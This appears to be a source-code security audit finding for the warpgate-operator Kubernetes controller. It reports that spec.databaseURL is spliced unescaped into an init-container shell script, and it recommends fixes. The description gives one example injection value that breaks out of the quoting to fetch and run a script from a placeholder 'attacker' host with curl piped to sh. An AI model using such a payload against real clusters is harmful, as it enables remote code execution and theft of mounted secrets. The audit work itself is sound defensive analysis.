summary: Reviewed the warpgate-operator Go controller code under internal/, cmd/, and api/ (Warpgate API client, all reconcilers, and admission webhooks). The operator is a Kubernetes controller that provisions Warpgate deployments and syncs users/credentials/targets to a Warpgate instance over HTTP. Overall the code handles Secrets carefully (no credential values are logged, passwords use crypto/rand, TLS skip-verify is an explicit opt-in). The one concrete flaw is a shell command injection: the user-controlled spec.databaseURL of a WarpgateInstance is interpolated unescaped into the init-container shell script. Coverage was source-only (no build/run); test files were skipped.

findings.title: Shell command injection via WarpgateInstance spec.databaseURL in init-container script
findings.description: buildDeployment builds a `/bin/sh -c` init script by string concatenation and interpolates the user-controlled field inst.Spec.DatabaseURL directly into the `warpgate ... unattended-setup --database-url "%s"` command with fmt.Sprintf. The value is only enclosed in double quotes, so a databaseURL such as `sqlite:/data/db";curl http://attacker/x|sh;echo "` breaks out of the quoting and executes arbitrary shell commands in the init container. The value is never validated: the WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go validateWarpgateInstance) only emits an informational warning for databaseURL and performs no character/escaping checks. The injected commands run in the init container, which has the admin-password Secret mounted as the ADMIN_PASSWORD env var and (when configured) the TLS key and SSH host/client key Secrets mounted, so injection can exfiltrate those secrets. Anyone able to create or update a WarpgateInstance CR can reach this sink.
findings.evidence: L549-558: setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password "${ADMIN_PASSWORD}"`, ...); if inst.Spec.DatabaseURL != "" { setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL) }. setupCmd is then joined into initScript (L567-611) and run as Command: []string{"/bin/sh", "-c", initScript} (L776). No sanitization of DatabaseURL exists in the webhook.
findings.recommendation: Do not interpolate untrusted values into a shell string. Pass the database URL to the warpgate binary as a discrete argument vector (e.g. build the init container command as an argv slice rather than a `sh -c` string), or pass DatabaseURL via an environment variable populated from a Secret/field and reference it with proper quoting the way ADMIN_PASSWORD is handled. At minimum, add strict validation in the validating webhook that rejects databaseURL values containing shell metacharacters (", `, $, ;, |, &, newline, etc.).
